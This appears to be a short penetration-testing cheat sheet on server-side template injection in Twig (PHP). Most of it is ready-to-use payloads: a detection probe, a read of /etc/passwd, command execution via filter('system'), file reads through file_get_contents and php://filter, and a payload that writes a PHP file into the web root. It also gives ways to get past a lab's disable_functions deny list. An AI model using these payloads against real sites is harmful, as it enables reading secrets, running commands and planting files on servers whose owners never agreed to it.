This type of SSTI involves the use of Twig(PHP) by the backend.

### Reference
[PayloadsAllTheThings/Server Side Template Injection at master Â· swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

## How to identify?
```twig
{{7*7}}
If you get 49 then you are gucci!
```

## Useful payloads
```twig
//LFI 
"{{'/etc/passwd'|file_excerpt(1,30)}}"@


//RCE
{{['id']|filter('system')}}
```


## Bypasses
Sometimes there might be some blocks in place that are not allowing you to execute some "dangerous" PHP functions. 

In the example the following PHP functions are disabled.
```bash
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Secure PHP Installation
mkdir -p /etc/php82/conf.d
mkdir -p /run/apache2

echo "disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create, mail" >> /etc/php82/conf.d/disablefns.ini
echo "open_basedir = /www" >> /etc/php82/conf.d/openbdir.ini

# Run supervisord
/usr/bin/supervisord -c /etc/supervisord.conf
```
(System, exec, popen any many more are disabled, this means the usual payloads will not work.) This because {{['id']|filter('<font color="#c00000">system</font>')}}  -- <font color="#c00000">system</font> is disabled

To bypass we can check the full list of dangerous functions available in PHP: [Dangerous PHP Functions (github.com)](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)

### LFI bypass
```twig
{{['file:///www/src/Controller/DefaultController.php']|map('file_get_contents')|join}


OR for Binary files
{{['php://filter/convert.base64-encode/resource=/www/src/Controller/DefaultController.php']|map('file_get_contents')|join}
```

### Write-File
```twig
{{['/www/public/info.php', '<?php phpinfo();?>']|sort('file_put_contents')}}
```